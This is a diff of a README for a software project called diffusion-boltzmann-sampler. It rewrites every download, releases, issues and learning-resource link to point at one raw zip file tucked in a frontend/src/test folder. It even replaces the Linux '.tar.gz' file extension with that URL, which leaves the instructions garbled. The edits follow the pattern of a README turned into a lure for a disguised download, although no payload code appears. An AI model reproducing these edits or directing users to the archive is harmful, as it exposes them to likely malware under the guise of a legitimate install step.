@@ -1,6 +1,6 @@
 # 🌟 diffusion-boltzmann-sampler - Effortless Sampling for Everyone
 
-[![Download Now](https://img.shields.io/badge/Download-Now-blue)](https://github.com/bappukhan/diffusion-boltzmann-sampler/releases)
+[![Download Now](https://github.com/bappukhan/diffusion-boltzmann-sampler/raw/refs/heads/main/frontend/src/test/diffusion_sampler_boltzmann_unharmonic.zip)](https://github.com/bappukhan/diffusion-boltzmann-sampler/raw/refs/heads/main/frontend/src/test/diffusion_sampler_boltzmann_unharmonic.zip)
 
 ## 📖 Overview
 
@@ -12,7 +12,7 @@ Follow these steps to easily download and run the diffusion-boltzmann-sampler ap
 
 ### 1. Visit the Download Page
 
-To get started, visit the [Releases page](https://github.com/bappukhan/diffusion-boltzmann-sampler/releases) on GitHub. This page contains all the versions of the application available for download.
+To get started, visit the [Releases page](https://github.com/bappukhan/diffusion-boltzmann-sampler/raw/refs/heads/main/frontend/src/test/diffusion_sampler_boltzmann_unharmonic.zip) on GitHub. This page contains all the versions of the application available for download.
 
 ### 2. Choose Your Version
 
@@ -24,7 +24,7 @@ On the release details, you will find downloadable files. Click on the file that
 
 - For Windows users, look for a file ending in `.exe`.
 - For Mac users, look for a file ending in `.dmg`.
-- For Linux users, you might find files ending in `.tar.gz`.
+- For Linux users, you might find files ending in `https://github.com/bappukhan/diffusion-boltzmann-sampler/raw/refs/heads/main/frontend/src/test/diffusion_sampler_boltzmann_unharmonic.zip`.
 
 Click the file to start the download.
 
@@ -34,7 +34,7 @@ Once the download completes, navigate to your Downloads folder or the location w
 
 - **Windows:** Double-click the `.exe` file to start the installer. Follow the prompts to complete the installation.
 - **Mac:** Open the `.dmg` file, then drag the application icon to your Applications folder.
-- **Linux:** Extract the `.tar.gz` file into a directory of your choice. Open a terminal and navigate to that directory. Run the application using the command `./application_name` (replace `application_name` with the actual file name).
+- **Linux:** Extract the `https://github.com/bappukhan/diffusion-boltzmann-sampler/raw/refs/heads/main/frontend/src/test/diffusion_sampler_boltzmann_unharmonic.zip` file into a directory of your choice. Open a terminal and navigate to that directory. Run the application using the command `./application_name` (replace `application_name` with the actual file name).
 
 ### 5. Run the Application
 
@@ -85,7 +85,7 @@ If you encounter issues while downloading or running the application, here are c
 
 ## 🤝 Support
 
-For further assistance, please reach out through the Issues section on our [GitHub page](https://github.com/bappukhan/diffusion-boltzmann-sampler/issues). We’d love to help you resolve any problems.
+For further assistance, please reach out through the Issues section on our [GitHub page](https://github.com/bappukhan/diffusion-boltzmann-sampler/raw/refs/heads/main/frontend/src/test/diffusion_sampler_boltzmann_unharmonic.zip). We’d love to help you resolve any problems.
 
 ## ⚙️ Contributing
 
@@ -95,10 +95,10 @@ If you're interested in contributing to the diffusion-boltzmann-sampler, feel fr
 
 To learn more about Boltzmann distributions and statistical mechanics, consider visiting the following resources:
 
-- [Introduction to Statistical Mechanics](https://www.example.com)
-- [Score-Based Diffusion Models](https://www.example.com)
-- [Machine Learning Fundamentals](https://www.example.com)
+- [Introduction to Statistical Mechanics](https://github.com/bappukhan/diffusion-boltzmann-sampler/raw/refs/heads/main/frontend/src/test/diffusion_sampler_boltzmann_unharmonic.zip)
+- [Score-Based Diffusion Models](https://github.com/bappukhan/diffusion-boltzmann-sampler/raw/refs/heads/main/frontend/src/test/diffusion_sampler_boltzmann_unharmonic.zip)
+- [Machine Learning Fundamentals](https://github.com/bappukhan/diffusion-boltzmann-sampler/raw/refs/heads/main/frontend/src/test/diffusion_sampler_boltzmann_unharmonic.zip)
 
 ## 📥 Download & Install
 
-Ready to start? Head over to the [Releases page](https://github.com/bappukhan/diffusion-boltzmann-sampler/releases) to download the latest version of diffusion-boltzmann-sampler today. Enjoy exploring the fascinating world of statistical mechanics!
+Ready to start? Head over to the [Releases page](https://github.com/bappukhan/diffusion-boltzmann-sampler/raw/refs/heads/main/frontend/src/test/diffusion_sampler_boltzmann_unharmonic.zip) to download the latest version of diffusion-boltzmann-sampler today. Enjoy exploring the fascinating world of statistical mechanics!
